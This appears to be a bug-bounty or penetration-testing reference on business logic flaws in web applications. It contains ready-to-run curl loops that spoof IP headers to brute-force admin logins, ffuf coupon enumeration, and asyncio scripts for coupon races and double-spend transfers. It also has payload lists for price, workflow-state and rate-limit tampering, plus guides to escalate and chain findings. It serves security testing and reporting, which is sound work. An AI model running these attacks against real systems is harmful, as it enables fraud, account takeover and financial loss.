# Business Logic Vulnerabilities Reference

## Covers: Payment Bypass, Workflow Abuse, Rate Limiting Bypass, Coupon/Voucher Abuse, Race Conditions in Business Flows

---

## 1. Testing Checklist

### Payment Bypass
1. Modify price/amount parameters in payment requests (change to 0, negative, or 0.01)
2. Modify currency parameter (switch from USD to a weaker currency)
3. Intercept and modify the payment callback/webhook from payment processor
4. Test if payment verification is client-side (modify JS to skip validation)
5. Remove or modify the cart total between cart and checkout
6. Add items to cart after price calculation but before payment submission
7. Test free trial abuse: sign up, cancel before charge, repeat with same payment method
8. Test refund logic: purchase, get product/service, then refund
9. Modify quantity to 0 or negative values
10. Test discount stacking: apply multiple discount codes simultaneously
11. Check if payment confirmation is checked server-side before order fulfillment
12. Test partial payment: modify the amount paid while keeping the order total

### Workflow Abuse
1. Map the full multi-step workflow (registration, checkout, onboarding, KYC)
2. Skip steps by directly accessing later-stage endpoints
3. Repeat steps that should be one-time only
4. Go backward in the flow after completing a step
5. Test parallel execution of the same workflow step
6. Modify state/status parameters between steps
7. Test flow with missing required data at each step
8. Check if completed steps can be undone without resetting dependent steps
9. Test timeout handling: what happens if you wait too long between steps?
10. Test cross-user workflow interference: use tokens/IDs from different sessions

### Rate Limiting Bypass
1. Test baseline: how many requests before limit kicks in?
2. Rotate IP via `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP` headers
3. Test with different User-Agent values
4. Change case of endpoint URL: `/api/Login` vs `/api/login`
5. Add path parameters: `/api/login/` vs `/api/login` vs `/api/login?`
6. Use HTTP/2 multiplexing for higher throughput
7. Test rate limit per account vs per IP vs per session
8. Add null bytes or whitespace to parameters to create "different" requests
9. Test if rate limit resets with new session/cookie
10. Test API version endpoints for different rate limits
11. Use IPv6 if available (often separate rate limit pool)

### Coupon/Voucher Abuse
1. Apply same coupon code multiple times
2. Test coupon on already-discounted items (discount stacking)
3. Modify coupon value in the request
4. Test expired coupon codes (check if expiry is enforced server-side)
5. Brute force coupon codes (common patterns: SAVE10, WELCOME20, etc.)
6. Test coupon transfer between accounts
7. Apply coupon, increase cart total, check if discount percentage recalculates
8. Test if removing the coupon-qualifying item after applying discount keeps the discount
9. Race condition: apply same single-use coupon from multiple sessions simultaneously
10. Test referral code abuse: self-referral, multiple accounts

### Race Conditions in Business Flows
1. Simultaneous coupon redemption from multiple sessions
2. Concurrent balance transfers exceeding available balance (double-spend)
3. Parallel vote/like submissions exceeding per-user limits
4. Simultaneous inventory purchases when stock is low
5. Concurrent prize claims in limited-quantity promotions
6. Race between account deletion and data export
7. Parallel session creation to bypass concurrent session limits
8. Simultaneous bid submissions in auction close windows

---

## 2. Tool Commands

### Payment Testing
```bash
# Intercept and modify payment request (Burp Suite is primary tool)
# Modify price parameter
curl -s -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 123, "quantity": 1, "price": 0.01, "currency": "USD"}'

# Test negative quantity
curl -s -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"product_id": 123, "quantity": -1}'

# Test currency manipulation
curl -s -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"amount": 100, "currency": "IDR"}'  # 1 USD = ~15000 IDR
```

### Rate Limiting Bypass
```bash
# Test with rotating X-Forwarded-For
for i in $(seq 1 100); do
  ip="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST "https://target.com/api/login" \
    -H "X-Forwarded-For: $ip" \
    -d '{"username":"admin","password":"attempt'$i'"}'
done

# Test with IP header rotation
for header in "X-Forwarded-For" "X-Real-IP" "True-Client-IP" "X-Client-IP" "X-Originating-IP" "CF-Connecting-IP" "Fastly-Client-IP"; do
  echo "=== $header ==="
  for i in $(seq 1 10); do
    curl -s -o /dev/null -w "%{http_code} " \
      -X POST "https://target.com/api/login" \
      -H "$header: 1.2.3.$i" \
      -d '{"username":"admin","password":"wrong"}'
  done
  echo
done

# Test case sensitivity in path
for path in "/api/login" "/API/LOGIN" "/Api/Login" "/api/Login" "/api/login/" "/api/login?"; do
  echo "=== $path ==="
  for i in $(seq 1 10); do
    curl -s -o /dev/null -w "%{http_code} " \
      -X POST "https://target.com$path" \
      -d '{"username":"admin","password":"wrong"}'
  done
  echo
done
```

### Coupon Brute Force
```bash
# ffuf for coupon code enumeration
ffuf -u "https://target.com/api/coupon/validate" -X POST \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"FUZZ"}' \
  -w /usr/share/seclists/Fuzzing/special-chars.txt \
  -mc 200 -fc 404,400

# Common patterns
for prefix in SAVE DISCOUNT WELCOME FREE PROMO DEAL OFFER SALE; do
  for num in 5 10 15 20 25 30 40 50; do
    echo "${prefix}${num}"
  done
done | ffuf -u "https://target.com/api/coupon/validate" -X POST \
  -H "Authorization: Bearer TOKEN" \
  -d '{"code":"FUZZ"}' -w - -mc 200
```

### Race Condition Testing
```bash
# Turbo Intruder (Burp) - use race-single-packet-attack.py template
# This is the most reliable method for race conditions

# Parallel curl for coupon race
seq 1 30 | xargs -P 30 -I {} curl -s -o /dev/null -w "Request {}: %{http_code}\n" \
  -X POST "https://target.com/api/redeem" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "ONETIMEUSE50"}'

# Python asyncio race condition script
python3 -c "
import asyncio, aiohttp, json
async def race():
    async with aiohttp.ClientSession() as s:
        headers = {'Authorization': 'Bearer TOKEN', 'Content-Type': 'application/json'}
        body = json.dumps({'coupon_code': 'ONETIMEUSE50'})
        tasks = [s.post('https://target.com/api/redeem', headers=headers, data=body) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        for i, r in enumerate(results):
            text = await r.text()
            print(f'Request {i}: {r.status} - {text[:100]}')
asyncio.run(race())
"

# Balance transfer race (double spend)
python3 -c "
import asyncio, aiohttp, json
async def double_spend():
    async with aiohttp.ClientSession() as s:
        headers = {'Authorization': 'Bearer TOKEN', 'Content-Type': 'application/json'}
        body = json.dumps({'to_user': 'attacker2', 'amount': 1000})
        # Send 20 simultaneous transfer requests for full balance
        tasks = [s.post('https://target.com/api/transfer', headers=headers, data=body) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.status == 200)
        print(f'Successful transfers: {success} (expected: 1)')
asyncio.run(double_spend())
"
```

### Workflow Testing
```bash
# Skip steps - directly access final step
curl -s -X POST "https://target.com/api/onboarding/complete" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"step": "final"}'

# Repeat completed step
curl -s -X POST "https://target.com/api/trial/activate" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"plan": "premium"}'

# Access previous step
curl -s -X POST "https://target.com/api/checkout/step1" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"modified_data": "value"}'
```

---

## 3. Payloads

### Price Manipulation
```json
{"price": 0}
{"price": 0.01}
{"price": -100}
{"price": 0.001}
{"price": 1e-10}
{"price": "0"}
{"price": null}
{"total": 0, "subtotal": 100}
{"amount": 1, "currency": "VND"}
{"quantity": -1, "price": 100}
{"quantity": 0}
{"quantity": 99999999}
{"discount": 100}
{"discount": 101}
{"discount_percent": 100}
{"tax": -50}
{"shipping": -20}
```

### Workflow Step Manipulation
```json
// Skip to final step
{"step": 5, "completed_steps": [1,2,3,4]}
{"status": "approved"}
{"verified": true}
{"kyc_status": "passed"}
{"payment_status": "completed"}
{"email_verified": true}

// Repeat one-time action
{"action": "claim_bonus", "user_id": 123}
{"action": "activate_trial"}
{"action": "redeem_reward", "reward_id": 456}
```

### Rate Limit Bypass Headers
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-IP: 127.0.0.1
```

### Coupon Code Patterns
```
WELCOME10
WELCOME20
NEWUSER
FIRST10
FIRST20
SAVE10
SAVE20
SAVE50
DISCOUNT10
FREE
FREESHIP
FREESHIPING
BLACKFRIDAY
CYBERMONDAY
SUMMER20
WINTER20
HOLIDAY
LAUNCH
BETA
VIP
LOYALTY
BIRTHDAY
BOGO
HALFOFF
100OFF
```

---

## 4. Bypass Techniques

### Payment Bypass Methods
- **Price parameter tampering**: Modify the price in the request body (server trusts client-sent price)
- **Currency confusion**: Change currency to one with much lower value
- **Integer overflow**: Use extremely large quantities that overflow to negative/zero
- **Decimal precision**: Use `0.001` if the system truncates to `0.00`
- **Negative values**: Negative quantity or negative price to reduce total
- **Type confusion**: Send price as string `"0"` or null instead of number
- **Split payment abuse**: Pay part with wallet, modify the remaining amount
- **Webhook spoofing**: Send fake payment success webhook (check if origin is validated)
- **Replay payment confirmation**: Reuse a valid payment confirmation for a new order

### Rate Limit Bypass Methods
- **IP rotation headers**: `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP` with rotating IPs
- **Path variation**: `/api/login` vs `/api/login/` vs `/API/login` vs `/api/./login`
- **Parameter padding**: Add dummy params `?_=123` or change param order
- **HTTP method**: Try POST vs PUT vs PATCH
- **Unicode padding**: Add zero-width spaces or invisible characters to parameters
- **API version**: `/v1/login` vs `/v2/login` (different rate limit pools)
- **Distributed attack**: Multiple IPs via cloud functions / proxies
- **Session rotation**: New session per request batch
- **Encoding variation**: URL encode parameters differently each time

### Workflow Bypass
- **Direct endpoint access**: Skip intermediary steps by calling the final API directly
- **Token/state reuse**: Reuse tokens from previous flow completions
- **Parallel flows**: Start multiple flows and complete them simultaneously
- **State injection**: Modify session/JWT to indicate steps are completed
- **Time manipulation**: If flow depends on time, check server timezone handling

---

## 5. Impact Escalation

### Payment Bypass
- Purchase products/services for free or vastly reduced price
- Generate unlimited store credit via negative value purchases
- Obtain premium subscriptions without payment
- Scalable financial loss for the target (calculate potential total loss)
- Chain: purchase expensive items -> resell at market value

### Workflow Abuse
- Skip KYC/identity verification -> use platform for fraud/money laundering
- Bypass approval processes -> unauthorized access to features
- Repeat one-time bonuses -> financial loss
- Skip security steps -> access protected resources

### Rate Limiting Bypass
- Brute force credentials -> account takeover at scale
- Brute force OTP codes -> MFA bypass
- Enumerate users, coupons, or resources
- Spam/abuse endpoints -> DoS or reputation damage

### Coupon/Voucher Abuse
- Unlimited discounts on all purchases
- Generate and sell valid coupon codes
- Stack discounts to get items for free
- Abuse referral programs for unlimited credits

### Race Conditions
- Double-spend account balance
- Claim limited rewards multiple times
- Exceed inventory limits
- Bypass one-per-user restrictions

---

## 6. Chain Opportunities

| Found This | Look For |
|---|---|
| Payment bypass | Chain with bulk orders for maximum financial impact |
| Price manipulation | Negative values for store credit generation |
| Rate limit bypass | Brute force login -> ATO, brute force OTP -> MFA bypass |
| Coupon brute force | Find valid codes then test for stacking and race conditions |
| Race condition on redemption | Test on balance transfers, votes, inventory purchases |
| Workflow skip | Skip verification -> access features requiring verification |
| Free trial abuse | Create multiple accounts for unlimited premium access |
| Refund abuse | Purchase -> use/download -> refund -> keep product |

---

## 7. Common False Positives

- **Price manipulation**: Server recalculates the price server-side and ignores client-sent values (verify the actual charge, not just the response)
- **Rate limiting**: Limit exists but at a different threshold than tested (test more requests)
- **Rate limiting**: Limit is per IP and your testing IP headers aren't trusted by the server
- **Coupon abuse**: Coupon is intentionally reusable or stackable (check terms of service)
- **Race condition**: Multiple 200 responses but only one actually processed (check actual state: balance, inventory, etc.)
- **Workflow skip**: Endpoint returns 200 but the step wasn't actually completed (check side effects)
- **Negative quantity**: Server returns success but the order isn't actually created
- **Free trial**: Program explicitly excludes free trial abuse from scope

---

## 8. Report Snippets

### Payment Bypass
> The checkout endpoint at `[endpoint]` trusts client-supplied pricing data. By modifying the `[parameter]` from `[original_value]` to `[modified_value]` in the payment request, I was able to complete a purchase of `[product/service worth $X]` for `[$Y]`. This was verified by [checking order confirmation / receiving the product / accessing the paid feature]. At scale, this allows an attacker to obtain unlimited products and services at arbitrary prices, resulting in direct financial loss.

### Race Condition
> The `[endpoint]` is vulnerable to a race condition that allows bypassing the [one-time use / balance check / inventory check] constraint. By sending `[N]` concurrent requests using [technique: single-packet attack / parallel curl], `[M]` requests succeeded instead of the expected 1. This resulted in [specific impact: $X extra discount applied / balance spent N times / N items claimed instead of 1]. The application lacks proper database-level locking on the `[resource]`.

### Rate Limiting Bypass
> The rate limiting on `[endpoint]` can be bypassed by [specific technique: rotating X-Forwarded-For header / varying URL path case / adding path parameters]. By rotating `[header/technique]`, I was able to send `[N]` requests per minute against the `[login/OTP verification/password reset]` endpoint, compared to the intended limit of `[M]`. This enables brute force attacks against [credentials / OTP codes], leading to [account takeover / MFA bypass].

### Coupon Abuse
> The coupon system at `[endpoint]` allows [specific abuse: reuse of single-use codes / stacking of exclusive discounts / application of expired codes]. By [specific technique], I was able to obtain `[discount amount/percentage]` on [order type]. This can be repeated indefinitely, resulting in [potential financial impact]. The server fails to enforce [specific missing check] at the time of redemption.

### Workflow Bypass
> The multi-step `[workflow name]` can be bypassed by directly accessing `[endpoint]` without completing the required preceding steps ([list skipped steps]). This allowed me to [specific unauthorized action] without [required verification/payment/approval]. The application relies on client-side flow enforcement rather than server-side state validation for the workflow progression.
